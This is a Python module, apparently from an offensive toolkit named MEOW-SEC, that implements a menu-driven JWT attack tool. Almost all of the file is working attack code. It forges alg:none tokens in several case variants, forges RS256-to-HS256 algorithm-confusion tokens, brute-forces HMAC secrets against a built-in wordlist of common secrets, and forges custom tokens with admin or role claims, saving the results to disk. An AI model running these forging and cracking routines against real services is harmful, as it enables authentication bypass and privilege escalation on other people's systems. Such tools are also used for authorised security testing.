# -*- coding: utf-8 -*-
"""
MEOW-SEC :: JWTCAT — JWT Attacker
  · Décodage complet (header, payload, signature)
  · Attaque alg:none  (null signature bypass)
  · Confusion RS256 → HS256
  · Brute-force secret HMAC avec wordlist
  · Forge de token custom
"""
import base64, json, hmac, hashlib, os, time
from datetime import datetime

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN, CAT_FOUND, CAT_PWNED
from rich.panel   import Panel
from rich.table   import Table
from rich.text    import Text
from rich.syntax  import Syntax
from rich.align   import Align
from rich.prompt  import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn, TimeElapsedColumn
from rich         import box
from rich.rule    import Rule

# ─── JWT UTILS ───────────────────────────────────────────────

def _b64d(s: str) -> bytes:
    """Base64url decode, with padding fix"""
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def _b64e(b: bytes) -> str:
    """Base64url encode, no padding"""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def decode_jwt(token: str) -> dict | None:
    parts = token.strip().split(".")
    if len(parts) != 3:
        err("Not a valid JWT (expected 3 parts)"); return None
    try:
        header  = json.loads(_b64d(parts[0]))
        payload = json.loads(_b64d(parts[1]))
        sig_raw = parts[2]
        return {"header": header, "payload": payload,
                "sig_b64": sig_raw, "parts": parts}
    except Exception as e:
        err(f"Decode error: {e}"); return None

def _make_token(header: dict, payload: dict, secret: str = "") -> str:
    h  = _b64e(json.dumps(header,  separators=(",",":")).encode())
    p  = _b64e(json.dumps(payload, separators=(",",":")).encode())
    msg = f"{h}.{p}".encode()
    alg = header.get("alg","").upper()

    if alg == "NONE" or not secret:
        return f"{h}.{p}."

    algo_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    fn = algo_map.get(alg)
    if not fn:
        warn(f"Unsupported algo for forge: {alg} — using HS256")
        fn = hashlib.sha256
        header["alg"] = "HS256"
        h  = _b64e(json.dumps(header, separators=(",",":")).encode())
        p  = _b64e(json.dumps(payload,separators=(",",":")).encode())
        msg = f"{h}.{p}".encode()

    sig = hmac.new(secret.encode(), msg, fn).digest()
    return f"{h}.{p}.{_b64e(sig)}"

# ─── ATTACKS ─────────────────────────────────────────────────

def attack_alg_none(token: str) -> list:
    """Forges: alg=none, alg=None, alg=NONE, alg=nOnE"""
    d = decode_jwt(token)
    if not d: return []
    variants = []
    for alg_val in ["none", "None", "NONE", "nOnE", "NoNe"]:
        hdr = {**d["header"], "alg": alg_val}
        forged = _make_token(hdr, d["payload"], "")
        variants.append((alg_val, forged))
    return variants

def attack_rs256_hs256(token: str, pubkey: str) -> str | None:
    """
    Algorithme confusion RS256 → HS256
    Signe le token avec la clé publique comme secret HMAC.
    """
    try:
        d = decode_jwt(token)
        if not d: return None
        hdr = {**d["header"], "alg": "HS256"}
        forged = _make_token(hdr, d["payload"], pubkey)
        return forged
    except Exception as e:
        err(f"RS256→HS256 error: {e}"); return None

def brute_secret(token: str, wordlist: list, alg: str = "HS256") -> str | None:
    """Brute-force du secret HMAC"""
    parts = token.strip().split(".")
    if len(parts) != 3:
        err("Invalid JWT"); return None
    msg = f"{parts[0]}.{parts[1]}".encode()
    sig_target = _b64d(parts[2])

    algo_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    fn = algo_map.get(alg.upper(), hashlib.sha256)

    with Progress(
        SpinnerColumn(style=G1),
        TextColumn(f"[{G1}]Brute-force JWT secret"),
        BarColumn(bar_width=30, style=G2, complete_style=G1),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        console=console
    ) as prog:
        task = prog.add_task("", total=len(wordlist))
        for word in wordlist:
            prog.advance(task)
            try:
                test_sig = hmac.new(word.encode(), msg, fn).digest()
                if test_sig == sig_target:
                    prog.log(f"  [{G1}]★  SECRET FOUND: {word}[/]")
                    return word
            except Exception:
                continue
    return None

# ─── MINI WORDLIST ───────────────────────────────────────────

JWT_MINI_WL = [
    "secret","password","123456","qwerty","admin","test","jwt","token",
    "key","mysecret","supersecret","your-secret-key","your-256-bit-secret",
    "ChangeMe","change_me","changeme","s3cr3t","p@ssw0rd","secret123",
    "mysecretkey","secretkey","jwtpassword","jwt_secret","app_secret",
    "SECRET_KEY","FLASK_SECRET","DJANGO_SECRET","rails_secret","node_secret",
    "1234567890","abcdefghijklmnopqrstuvwxyz","ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "0123456789","Hello World","HS256","HS512","auth_secret",
    "super-secret","top-secret","very-secret","not-so-secret",
]

# ─── MAIN ────────────────────────────────────────────────────

def run():
    show_module_banner("jwtcat")
    cat_talk(CAT_SCAN, "JWT attack engine loaded.", OR)
    console.print()

    while True:
        console.print(f"  [{G1}][1][/] Decode JWT  (header · payload · exp check)")
        console.print(f"  [{G1}][2][/] Attack: alg:none  (null signature bypass)")
        console.print(f"  [{G1}][3][/] Attack: RS256 → HS256  (algorithm confusion)")
        console.print(f"  [{G1}][4][/] Brute-force HMAC secret")
        console.print(f"  [{G1}][5][/] Forge custom token")
        console.print(f"  [{G1}][0][/] Back")
        console.print()
        choice = ask_choice("JWTCAT", "0")

        if choice == "0": break
        elif choice == "1": _decode_menu()
        elif choice == "2": _alg_none_menu()
        elif choice == "3": _rs256_menu()
        elif choice == "4": _brute_menu()
        elif choice == "5": _forge_menu()
        console.print()

def _decode_menu():
    console.print(Rule(f"[{G1}] JWT DECODER ", style=G2))
    token = Prompt.ask(f"  [{G1}]◈ JWT token[/]").strip()
    if not token: return
    d = decode_jwt(token)
    if not d: return

    _print_jwt_table(d)

def _print_jwt_table(d: dict):
    console.print()
    # Header
    console.print(Panel(
        Syntax(json.dumps(d["header"], indent=2), "json", theme="monokai"),
        title=f"[{CY}]◈ Header", border_style=CY, padding=(0,1)
    ))
    # Payload
    console.print(Panel(
        Syntax(json.dumps(d["payload"], indent=2), "json", theme="monokai"),
        title=f"[{G1}]◈ Payload", border_style=G1, padding=(0,1)
    ))
    # Signature
    sig_status = f"[{DM}]{d['sig_b64'][:40]}...[/]" if d["sig_b64"] else f"[{RD}]EMPTY (alg:none!)[/]"
    console.print(f"  [{OR}]◈ Signature:[/] {sig_status}")

    # Checks
    console.print()
    payload = d["payload"]
    alg     = d["header"].get("alg","?")
    alg_c   = RD if alg.lower() == "none" else (OR if alg.startswith("HS") else G1)
    info(f"Algorithm: [{alg_c}]{alg}[/]")

    if "exp" in payload:
        exp  = payload["exp"]
        now  = time.time()
        diff = exp - now
        if diff < 0:
            warn(f"Token EXPIRED {abs(diff)/3600:.1f}h ago")
        else:
            ok(f"Token expires in {diff/3600:.1f}h")
    else:
        warn("No expiration (exp) claim — token never expires!")

    if "iat" in payload:
        issued = datetime.fromtimestamp(payload["iat"]).strftime("%Y-%m-%d %H:%M:%S")
        info(f"Issued at: {issued}")

    for claim in ("sub","iss","aud","role","admin","user_id"):
        if claim in payload:
            info(f"{claim}: [{CY}]{payload[claim]}[/]")

def _alg_none_menu():
    console.print(Rule(f"[{G1}] ALG:NONE ATTACK ", style=G2))
    info("Removes the signature — some servers accept tokens with alg=none")
    token = Prompt.ask(f"  [{G1}]◈ JWT token[/]").strip()
    if not token: return

    variants = attack_alg_none(token)
    if not variants:
        err("Could not generate variants"); return

    console.print()
    for alg_val, forged in variants:
        console.print(Panel(
            f"[{G1}]{forged}[/]",
            title=f"[{OR}]alg={alg_val}",
            border_style=OR
        ))
    ok(f"Generated {len(variants)} forged tokens")
    _save_forged(variants, "alg_none")

def _rs256_menu():
    console.print(Rule(f"[{G1}] RS256 → HS256 CONFUSION ", style=G2))
    info("Server uses the RSA public key as HMAC secret — classic JWT confusion attack")
    warn("You need the server's RSA public key (PEM format or raw)")
    token  = Prompt.ask(f"  [{G1}]◈ JWT token (RS256)[/]").strip()
    pubkey = Prompt.ask(f"  [{G1}]◈ Public key (PEM or raw)[/]").strip()
    if not token or not pubkey: return

    # Load from file if path given
    if os.path.exists(pubkey):
        pubkey = open(pubkey, encoding="utf-8").read().strip()

    forged = attack_rs256_hs256(token, pubkey)
    if forged:
        console.print(Panel(
            f"[{G1}]{forged}[/]",
            title=f"[{OR}]◈ Forged HS256 token ◈",
            border_style=OR
        ))
        _save_forged([("rs256_to_hs256", forged)], "rs256_hs256")

def _brute_menu():
    console.print(Rule(f"[{G1}] HMAC SECRET BRUTE-FORCE ", style=G2))
    token = Prompt.ask(f"  [{G1}]◈ JWT token (HS256/HS384/HS512)[/]").strip()
    if not token: return

    d = decode_jwt(token)
    if not d: return
    alg = d["header"].get("alg", "HS256")
    info(f"Algorithm: [{CY}]{alg}[/]")

    console.print(f"  [{G1}][1][/] Built-in JWT wordlist  ({len(JWT_MINI_WL)} secrets)")
    console.print(f"  [{G1}][2][/] Custom wordlist file")
    console.print(f"  [{G1}][3][/] Both")
    wl_choice = ask_choice("Wordlist", "1")

    wordlist = []
    if wl_choice in ("1","3"):
        wordlist += JWT_MINI_WL
    if wl_choice in ("2","3"):
        path = Prompt.ask(f"  [{G1}]◈ Wordlist path[/]").strip()
        if os.path.exists(path):
            wordlist += [l.strip() for l in open(path, encoding="utf-8", errors="ignore") if l.strip()]
        else:
            err(f"Not found: {path}")

    info(f"Trying {len(wordlist)} secrets with {alg}...")
    secret = brute_secret(token, wordlist, alg)
    if secret:
        cat_talk(CAT_PWNED, f"Secret found: {secret}", G1)
    else:
        warn("Secret not found in wordlist.")

def _forge_menu():
    console.print(Rule(f"[{G1}] FORGE JWT ", style=G2))
    info("Create a custom signed (or unsigned) JWT token")

    token = Prompt.ask(f"  [{G1}]◈ Base token (to clone payload, or 'new')[/]").strip()
    if token and token.lower() != "new" and "." in token:
        d = decode_jwt(token)
        if d:
            payload = d["payload"].copy()
            header  = d["header"].copy()
            info("Loaded payload from token:")
            console.print(Syntax(json.dumps(payload, indent=2), "json", theme="monokai"))
        else:
            payload = {}; header = {"alg":"HS256","typ":"JWT"}
    else:
        payload = {}; header = {"alg":"HS256","typ":"JWT"}

    # Modifier le payload
    console.print()
    console.print(f"  [{DM}]Add/modify claims (empty = keep current):[/]")
    for claim_hint in [("sub","Subject (user ID)"), ("role","Role (admin/user)"),
                       ("admin","Admin flag (true/false)"), ("exp","Expiry (Unix ts)")]:
        k, hint = claim_hint
        val = Prompt.ask(f"  [{G1}]◈ {k} [{hint}][/]", default="").strip()
        if val:
            try:    payload[k] = json.loads(val)
            except: payload[k] = val

    alg    = Prompt.ask(f"  [{G1}]◈ Algorithm[/]", default=header.get("alg","HS256"))
    header["alg"] = alg

    secret = ""
    if alg.upper() != "NONE":
        secret = Prompt.ask(f"  [{G1}]◈ Secret (empty = unsigned)[/]", default="").strip()

    forged = _make_token(header, payload, secret)
    console.print()
    console.print(Panel(
        f"[{G1}]{forged}[/]",
        title=f"[{OR}]◈ Forged JWT  ({alg}) ◈",
        border_style=OR
    ))
    _save_forged([("forged", forged)], "forge")

def _save_forged(variants: list, tag: str):
    os.makedirs("data", exist_ok=True)
    fname = f"data/jwt_{tag}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        for name, tok in variants:
            f.write(f"# {name}\n{tok}\n\n")
    ok(f"Saved: {fname}")

def _banner():
    logo = Text(r"""
      ██╗██╗    ██╗████████╗ ██████╗ █████╗ ████████╗
      ██║██║    ██║╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
      ██║██║ █╗ ██║   ██║   ██║     ███████║   ██║
 ██   ██║██║███╗██║   ██║   ██║     ██╔══██║   ██║
 ╚█████╔╝╚███╔███╔╝   ██║   ╚██████╗██║  ██║   ██║
  ╚════╝  ╚══╝╚══╝    ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝
  [ALG:NONE · RS256→HS256 · BRUTE SECRET · FORGE]""",
        style=f"bold {OR}")
    console.print(Panel(Align(logo, align="center"), border_style=OR, padding=(0,1)))
